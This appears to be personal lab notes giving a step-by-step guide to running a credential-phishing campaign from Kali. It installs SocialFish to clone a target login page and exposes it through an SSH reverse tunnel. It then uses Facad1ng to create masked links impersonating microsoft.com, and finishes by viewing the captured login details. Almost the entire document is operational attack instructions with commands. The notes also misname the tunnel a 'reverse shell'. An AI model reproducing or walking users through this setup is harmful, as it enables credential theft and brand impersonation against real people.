# Setting up the environment on Kali
Update system:
```
apt update
apt upgrade -y
```

Clone SocialFish from TechSky:
```
cd /opt
git clone https://github.com/TechSky-Code/SocialFish.git
cd SocialFish/
```

Create a python environment to isolate independencies
```
python3 -m venv venv
```

Activate the environment:
```
source venv/bin/activate
```

Install the requirements:
```
pip3 install -r requirements.txt
```

Once installed, launch SocialFish
```
python3 SocialFish.py root toor
```
root => username
toor => Password

Once it launched, connect to the URL it specified and login useing the credentials you specified:
![[Pasted image 20260424114641.png]]

In the example, it's:
```
http://127.0.0.1:5000/neptune
```

On the site, in the clone text area, enter the website you want to clone (Yellow)
Redirect: This is where you want to user to redirect to once they enter their details (Green)

![[Pasted image 20260424115139.png]]

Once done, click the thunderbolt to start cloning the site, once done, click OK
![[Pasted image 20260424115448.png]]

Under the logo, click the link so that it loads the target site.
You can check the terminal for any progress.

# Create a public tunnel using localhost.run web service:

#### NOTE: localhost.run changes the URL every couple of minutes, you can register an account so that it lasts longer.

Open a new terminal window

Create a new SSH Key pair:
```
ssh-keygen -t rsa -b 4096 -C "ivan@netninenine.co.za"
```

Enter at any of the prompts.

Now create the reverse tunnel:
```
ssh -R 80:localhost:5000 ssh.localhost.run
```

A QR will display.
Scroll up and have a look at the public url which was generated
Example:
![[Pasted image 20260424122725.png]]

Open the browser and paste the link. You phishing site should open.

# URL Masking
To mask the URL, we will use Facad1ng
Open a new terminal and clone it:
```
cd /opt/phishing
https://github.com/spyboy-productions/Facad1ng.git
cd Facad1ng/
```

## Setting up Fecad1ng:
```
python3 -m venv venv
source venv/bin/activate
pip3 install -r requirements.txt
```

Run Fecad1ng:
```
python3 facad1ng.py 
```

Now paste you public URL link which was generated in previous steps when you created a reverse shell.
Enter the original link (ex: https://www.ngrok.com): 
```
https://96ddd0828381c9.lhr.life/
```

Next it will ask for the domain you want to impersonate:
Enter your custom domain (ex: gmail.com):
Enter Microsoft.com for example:
```
microsoft.com
```

It will now generate some links for you.
Example output:
```
╰➤ Shortener  1: https://microsoft.com-login@clck.ru/3TFx9d                                                                                        
╰➤ Shortener  2: http://microsoft.com-login@osdb.link/u9a47  
```


Example:
![[Pasted image 20260424123914.png]]

You can now test one of the masked URL's.
Enter the login details.
Return to your admin page, you should now see the test details you entered.

If you want to edit the cloned site, you can edit the code directly located in the SocialFish directory.



